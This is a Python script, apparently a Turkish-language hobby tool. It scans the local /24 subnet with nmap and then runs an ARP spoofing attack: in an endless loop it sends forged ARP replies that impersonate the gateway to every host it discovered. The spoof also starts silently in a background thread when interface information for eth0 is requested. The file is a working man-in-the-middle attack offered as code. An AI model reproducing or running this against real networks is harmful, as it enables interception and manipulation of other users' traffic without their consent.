from netifaces import AF_INET, AF_LINK
import netifaces as ni
import time
from threading import Thread
import nmap
from scapy.all import *

class Information():

    def __init__(self):
        print('[*] Information')
        self.spf = ArpSpoof().arpspoof
        self.spf1 = ArpSpoof()

    def networkInfo(self, iface):
        if iface == 'eth0':
            ip = ni.ifaddresses('eth0')[AF_INET][0]['addr']
            mac = ni.ifaddresses('eth0')[AF_LINK][0]['addr']
            gw = ni.gateways()[2][0][0]
            bcast = ni.ifaddresses('eth0')[AF_INET][0]['broadcast']
            nmask = ni.ifaddresses('eth0')[AF_INET][0]['netmask']
            Thread(target=self.spf, daemon=True).start()
            return ip, mac, gw, bcast, nmask

        elif iface == 'wlan0':
            ip = ni.ifaddresses('wlan0')[AF_INET][0]['addr']
            mac = ni.ifaddresses('wlan0')[AF_LINK][0]['addr']
            gw = ni.gateways()[2][1][0]
            bcast = ni.ifaddresses('wlan0')[AF_INET][0]['broadcast']
            nmask = ni.ifaddresses('wlan0')[AF_INET][0]['netmask']
            print('hala burdaym')
            return ip, mac, gw, bcast, nmask


class ArpSpoof():
    def __init__(self):
        self.ip = ''
        self.mac = ''
        self.gw = ''
        self.nmask = ''
        self.bcast = ''
        self.list = []
        self.iface = 'eth0'

    def get_network_name(self,iface):
        self.ip = ni.ifaddresses(iface)[AF_INET][0]['addr']
        index = self.ip.rfind('.')
        ip = self.ip[:index:] + '.0/24'
        self.iface = iface
        return ip

    def get_hosts_and_mac(self):
        print(self.iface)
        nm = nmap.PortScanner()
        hosts = []
        host = self.get_network_name(self.iface)
        sc = nm.scan(host, '80', '-sV -O')
        uphost = sc['nmap']['scanstats']['uphosts']
        host = sc['scan'].keys()
        for h in host:
            hosts.append(h)
        for ip in hosts:
            try:
                # imList.append([ip] + [sc['scan'][ip]['addresses']['mac']])
                self.list.append(ip)
            except:
                pass
        return self.list


    def get_sc(self):
        print(self.iface)
        nm = nmap.PortScanner()
        hosts = []
        host = self.get_network_name(self.iface)
        sc = nm.scan(host, '80', '-sV -O')
        uphost = sc['nmap']['scanstats']['uphosts']
        host = sc['scan'].keys()
        for h in host:
            hosts.append(h)
        imList = []
        for ip in hosts:
            try:
                imList.append([ip] + [sc['scan'][ip]['addresses']['mac']] + [
                    sc['scan']['192.168.134.1']['vendor'][sc['scan']['192.168.134.1']['addresses']['mac']]])
            except:
                pass
        return imList


    def arpspoof(self):
        conf.verb = 0
        self.mac = ni.ifaddresses(self.iface)[AF_LINK][0]['addr']
        if self.iface == 'eth0':
            gateway = ni.gateways()[2][0][0]
        else:
            gateway = ni.gateways()[2][1][0]
        hedef_ip = self.get_hosts_and_mac()
        print(hedef_ip)

        arp = ARP(op=2, psrc=gateway, pdst=hedef_ip, hwsrc=self.mac)
        print('[*] ARP Saldirisi Baslatildi ...')
        try:
            while 1:
                send(arp, iface='eth0')
                time.sleep(2)
        except KeyboardInterrupt:
            print('[*] Saldiri Bitti ...')


